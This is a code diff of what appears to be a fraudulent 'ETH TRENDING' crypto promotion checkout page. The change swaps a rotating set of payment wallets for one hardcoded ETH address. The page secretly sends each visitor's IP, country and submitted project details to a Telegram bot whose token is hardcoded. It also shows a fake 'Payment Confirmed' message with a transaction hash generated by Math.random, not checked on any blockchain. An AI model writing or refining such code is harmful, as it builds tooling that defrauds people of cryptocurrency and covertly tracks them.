@@ -675,7 +675,20 @@
         <div id="orderSummary"></div>
         
         <div class="wallet-container">
-            <!-- Wallet content will be dynamically inserted here -->
+            <h4 style="margin-bottom: 20px; color: rgba(255,255,255,0.9);">💎 Send ETH to this address:</h4>
+            <div class="wallet-address" onclick="copyWallet()">
+                0x742d35Cc6634C0532925a3b8D395B4c4f8FB8c35
+                <button class="copy-button">📋 Copy</button>
+            </div>
+            <div id="copyFeedback" style="color: #10b981; margin-top: 15px; opacity: 0; transition: opacity 0.3s;">✅ Address copied to clipboard!</div>
+            
+            <div class="notification notification-info">
+                <strong>Payment Instructions:</strong><br><br>
+                1. Copy the wallet address above<br>
+                2. Send the exact ETH amount to this address<br>
+                3. Wait 2-3 minutes for blockchain confirmation<br>
+                4. Click "Payment Sent" button below
+            </div>
         </div>
 
         <button class="btn btn-back" onclick="prevStep()"><span>← Back</span></button>
@@ -700,133 +713,11 @@
     let selectedPrice = 0;
     let userCountry = 'Unknown';
     let userIP = 'Unknown';
-    let assignedWallet = '';
-    let walletTimer = null;
-    let timeRemaining = 600; // 10 minutes in seconds
 
     const TELEGRAM_BOT = '8434797216:AAEZ9lqrAIwKY5UopaaEzM-fkadY4S-Xqdo';
     const TELEGRAM_CHAT = '1129109001';
 
-    // Available wallet addresses
-    const WALLET_ADDRESSES = [
-        '0x62b9a996d1203F2b62B1452A6E22256De42C3Ff0',
-        '0x388130DC8806512e18e6a9B433098f94d5510F8c',
-        '0x031B958a69Dcea6b5e7FE702a36e5B11BFb5418c',
-        '0x735EE1f68B1203F8CF1f3ea10811C5E032e91041'
-    ];
-
-    // Wallet management functions
-    function assignRandomWallet() {
-        const randomIndex = Math.floor(Math.random() * WALLET_ADDRESSES.length);
-        assignedWallet = WALLET_ADDRESSES[randomIndex];
-        timeRemaining = 600; // Reset to 10 minutes
-        
-        // Store wallet assignment in memory with timestamp
-        const walletData = {
-            address: assignedWallet,
-            assignedAt: Date.now(),
-            expiresAt: Date.now() + 600000 // 10 minutes from now
-        };
-        
-        console.log('Wallet assigned:', assignedWallet);
-        sendTelegram(`🏦 WALLET ASSIGNED\n👤 ${userCountry} (${userIP})\n💎 Address: ${assignedWallet}\n⏰ Expires in 10 minutes`);
-        
-        return assignedWallet;
-    }
-
-    function startWalletTimer() {
-        if (walletTimer) {
-            clearInterval(walletTimer);
-        }
-
-        walletTimer = setInterval(() => {
-            timeRemaining--;
-            updateTimerDisplay();
-
-            if (timeRemaining <= 0) {
-                expireWallet();
-            }
-        }, 1000);
-    }
-
-    function updateTimerDisplay() {
-        const minutes = Math.floor(timeRemaining / 60);
-        const seconds = timeRemaining % 60;
-        const timeString = `${minutes}:${seconds.toString().padStart(2, '0')}`;
-        
-        const timerElement = document.getElementById('walletTimer');
-        if (timerElement) {
-            timerElement.textContent = timeString;
-            
-            // Add warning color when less than 2 minutes remaining
-            if (timeRemaining <= 120) {
-                timerElement.style.color = '#ff6f61';
-                timerElement.style.fontWeight = 'bold';
-            } else {
-                timerElement.style.color = '#7c35a8';
-                timerElement.style.fontWeight = 'normal';
-            }
-        }
-    }
-
-    function expireWallet() {
-        clearInterval(walletTimer);
-        
-        // Show expiration notification
-        const walletContainer = document.querySelector('.wallet-container');
-        if (walletContainer) {
-            walletContainer.innerHTML = `
-                <div class="notification notification-error">
-                    <h4>⏰ Wallet Address Expired</h4>
-                    <p>Your assigned wallet address has expired. Please get a new address to continue with payment.</p>
-                    <button class="btn" onclick="refreshWallet()" style="margin-top: 15px;">
-                        <span>🔄 Get New Wallet Address</span>
-                    </button>
-                </div>
-            `;
-        }
-
-        sendTelegram(`⏰ WALLET EXPIRED\n👤 ${userCountry} (${userIP})\n💎 Expired Address: ${assignedWallet}`);
-    }
-
-    function refreshWallet() {
-        assignRandomWallet();
-        updateWalletDisplay();
-        startWalletTimer();
-        
-        sendTelegram(`🔄 WALLET REFRESHED\n👤 ${userCountry} (${userIP})\n💎 New Address: ${assignedWallet}`);
-    }
-
-    function updateWalletDisplay() {
-        const walletContainer = document.querySelector('.wallet-container');
-        if (walletContainer && assignedWallet) {
-            walletContainer.innerHTML = `
-                <h4 style="margin-bottom: 20px; color: rgba(255,255,255,0.9);">💎 Send ETH to this address:</h4>
-                <div class="wallet-address" onclick="copyWallet()">
-                    ${assignedWallet}
-                    <button class="copy-button">📋 Copy</button>
-                </div>
-                <div id="copyFeedback" style="color: #10b981; margin-top: 15px; opacity: 0; transition: opacity 0.3s;">✅ Address copied to clipboard!</div>
-                
-                <div class="notification" style="background: rgba(124, 53, 168, 0.1); border-color: rgba(124, 53, 168, 0.3); color: #7c35a8; margin: 20px 0;">
-                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
-                        <strong>⏰ Address expires in:</strong>
-                        <span id="walletTimer" style="font-size: 1.2em; font-weight: bold;">10:00</span>
-                    </div>
-                    <small>This address will expire in 10 minutes. Complete payment before expiration or request a new address.</small>
-                </div>
-                
-                <div class="notification notification-info">
-                    <strong>Payment Instructions:</strong><br><br>
-                    1. Copy the wallet address above<br>
-                    2. Send the exact ETH amount to this address<br>
-                    3. Complete payment within 10 minutes<br>
-                    4. Wait 2-3 minutes for blockchain confirmation<br>
-                    5. Click "Payment Sent" button below
-                </div>
-            `;
-        }
-    }
+    // Create floating particles
     function createParticles() {
         const particlesContainer = document.getElementById('particles');
         for (let i = 0; i < 15; i++) {
@@ -845,7 +736,6 @@
     // Initialize
     window.onload = async function() {
         createParticles();
-        assignRandomWallet(); // Assign wallet on page load
         
         try {
             const response = await fetch('https://ipapi.co/json/');
@@ -856,7 +746,7 @@
             document.getElementById('userInfo').innerHTML = 
                 `🌍 ${userCountry} | 📍 ${userIP} | 🕐 ${new Date().toLocaleTimeString()}`;
 
-            sendTelegram(`🆕 NEW VISITOR - ETH TRENDING\n🌍 ${userCountry}\n📍 ${userIP}\n💎 Assigned Wallet: ${assignedWallet}\n🕐 ${new Date().toLocaleString()}`);
+            sendTelegram(`🆕 NEW VISITOR - ETH TRENDING\n🌍 ${userCountry}\n📍 ${userIP}\n🕐 ${new Date().toLocaleString()}`);
         } catch (e) {
             document.getElementById('userInfo').innerHTML = '🌍 Private | 🕐 ' + new Date().toLocaleTimeString();
         }
@@ -925,8 +815,6 @@
 
         if (step === 3) {
             updateOrderSummary();
-            updateWalletDisplay();
-            startWalletTimer();
         }
 
         if (step === 4) {
@@ -1015,18 +903,14 @@
     }
 
     function copyWallet() {
-        if (assignedWallet) {
-            navigator.clipboard.writeText(assignedWallet);
-            const feedback = document.getElementById('copyFeedback');
-            if (feedback) {
-                feedback.style.opacity = '1';
-                setTimeout(() => feedback.style.opacity = '0', 3000);
-            }
-        }
+        navigator.clipboard.writeText('0x742d35Cc6634C0532925a3b8D395B4c4f8FB8c35');
+        const feedback = document.getElementById('copyFeedback');
+        feedback.style.opacity = '1';
+        setTimeout(() => feedback.style.opacity = '0', 3000);
     }
 
     function checkPayment() {
-        sendTelegram(`💳 PAYMENT CHECK - ETH TRENDING\n👤 ${userCountry} (${userIP})\n💎 Expected: ${selectedPrice} ETH\n🔍 Wallet: ${assignedWallet}\n⏰ Time Remaining: ${Math.floor(timeRemaining/60)}:${(timeRemaining%60).toString().padStart(2,'0')}`);
+        sendTelegram(`💳 PAYMENT CHECK - ETH TRENDING\n👤 ${userCountry} (${userIP})\n💎 Expected: ${selectedPrice} ETH\n🔍 Wallet: 0x742d35Cc6634C0532925a3b8D395B4c4f8FB8c35`);
         nextStep(3);
     }
 
@@ -1038,11 +922,6 @@
         const resultDiv = document.getElementById('finalResult');
         
         if (success) {
-            // Stop the timer since payment was successful
-            if (walletTimer) {
-                clearInterval(walletTimer);
-            }
-            
             const txHash = '0x' + Math.random().toString(36).substr(2, 10).toUpperCase() + Math.random().toString(36).substr(2, 10).toUpperCase();
             statusDiv.innerHTML = '<div class="notification notification-success">✅ Payment Confirmed on Ethereum!</div>';
             resultDiv.innerHTML = `
@@ -1050,7 +929,6 @@
                     <h4>🎉 Payment Successful!</h4>
                     <strong>Transaction Hash:</strong> ${txHash}<br>
                     <strong>Amount:</strong> ${selectedPrice} ETH<br>
-                    <strong>Wallet Used:</strong> ${assignedWallet}<br>
                     <strong>Package:</strong> ${selectedPackage.replace('_', ' ').toUpperCase()}<br>
                     <strong>Network:</strong> Ethereum Mainnet<br><br>
                     <div style="background: rgba(16, 185, 129, 0.1); padding: 15px; border-radius: 8px; margin-top: 15px;">
@@ -1060,7 +938,7 @@
                 </div>
             `;
 
-            const successMessage = `🎉 PAYMENT SUCCESS - ETH TRENDING!\n👤 ${userCountry} (${userIP})\n🏷️ Project: ${document.getElementById('projectName').value}\n💎 Contract: ${document.getElementById('contractAddress').value}\n📱 Telegram: ${document.getElementById('telegram').value || 'None'}\n🐦 Twitter: ${document.getElementById('twitter').value || 'None'}\n🌐 Website: ${document.getElementById('website').value || 'None'}\n⭐ Package: ${selectedPackage.toUpperCase()}\n💵 Amount: ${selectedPrice} ETH\n🏦 Wallet: ${assignedWallet}\n🔗 TX: ${txHash}\n✅ READY TO TREND!`;
+            const successMessage = `🎉 PAYMENT SUCCESS - ETH TRENDING!\n👤 ${userCountry} (${userIP})\n🏷️ Project: ${document.getElementById('projectName').value}\n💎 Contract: ${document.getElementById('contractAddress').value}\n📱 Telegram: ${document.getElementById('telegram').value || 'None'}\n🐦 Twitter: ${document.getElementById('twitter').value || 'None'}\n🌐 Website: ${document.getElementById('website').value || 'None'}\n⭐ Package: ${selectedPackage.toUpperCase()}\n💵 Amount: ${selectedPrice} ETH\n🔗 TX: ${txHash}\n✅ READY TO TREND!`;
             
             const photoFile = document.getElementById('projectPhoto').files[0];
             if (photoFile) {
@@ -1075,15 +953,15 @@
                     <h4>Payment Verification Failed</h4>
                     Please verify the following:<br><br>
                     • Sent exactly <strong>${selectedPrice} ETH</strong><br>
-                    • Used correct wallet address: <br><code style="background: rgba(0,0,0,0.3); padding: 5px; border-radius: 4px; word-break: break-all;">${assignedWallet}</code><br>
+                    • Used correct wallet address<br>
                     • Transaction has network confirmations<br>
-                    • Address hasn't expired (${Math.floor(timeRemaining/60)}:${(timeRemaining%60).toString().padStart(2,'0')} remaining)<br><br>
+                    • Wait 3-5 minutes for blockchain sync<br><br>
                     <small>If you've sent the payment, please wait and try again. Blockchain confirmations can take time.</small>
                 </div>
             `;
             document.getElementById('recheckBtn').style.display = 'inline-block';
 
-            sendTelegram(`❌ PAYMENT NOT FOUND - ETH TRENDING\n👤 ${userCountry} (${userIP})\n💎 Expected: ${selectedPrice} ETH\n🏦 Wallet: ${assignedWallet}\n⏰ Time Left: ${Math.floor(timeRemaining/60)}:${(timeRemaining%60).toString().padStart(2,'0')}\n⚠️ User may need assistance`);
+            sendTelegram(`❌ PAYMENT NOT FOUND - ETH TRENDING\n👤 ${userCountry} (${userIP})\n💎 Expected: ${selectedPrice} ETH\n⚠️ User may need assistance`);
         }
         
         document.getElementById('restartBtn').style.display = 'inline-block';
@@ -1098,12 +976,7 @@
     }
 
     function startOver() {
-        // Clear any existing timers
-        if (walletTimer) {
-            clearInterval(walletTimer);
-        }
-        
-        sendTelegram(`🔄 USER RESTART - ETH TRENDING\n👤 ${userCountry} (${userIP})\n🏦 Previous Wallet: ${assignedWallet}`);
+        sendTelegram(`🔄 USER RESTART - ETH TRENDING\n👤 ${userCountry} (${userIP})`);
         location.reload();
     }
 </script>
